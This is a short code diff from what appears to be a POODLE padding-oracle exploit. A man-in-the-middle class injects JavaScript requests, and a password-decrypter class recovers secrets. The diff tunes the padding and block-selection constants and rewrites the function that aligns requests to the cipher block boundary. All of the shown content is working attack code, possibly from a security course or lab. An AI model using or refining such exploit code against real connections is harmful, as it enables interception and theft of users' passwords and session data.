@@ -11,10 +11,10 @@ ORIGIN_CLIENT = "C"
 ORIGIN_SEPARATOR = "-"
 RESPONSE_SUCCESSFUL = "ok\n"
 
-PADDING_LAMBDA = 12 # To make request end on block boundary
+PADDING_LAMBDA = 4 # To make request end on block boundary
 
 PADDING_CHAR = "a"
-DECRYPT_BLOCK_FROM_LAST = 4 # Decrypt the 4th block counting from last
+DECRYPT_BLOCK_FROM_LAST = 5 # Decrypt the 5th block counting from last
 
 
 class PoodlePasswordDecrypter:
@@ -71,7 +71,7 @@ class MitmConnection:
 		self.wfile.write('post("/%s", "csrf=%s&%s");\n' % (url_chars, csrf, body_chars))
 	
 	def __get_num_chars_to_make_request_fill_last_block(self, num_variable_chars):
-		return (BLOCK_LENGTH - ((num_variable_chars + PADDING_LAMBDA) % BLOCK_LENGTH))
+		return (PADDING_LAMBDA - num_variable_chars) % BLOCK_LENGTH
 	
 	def forward_loop(self):
 		packet = self.get_mitm_packet()
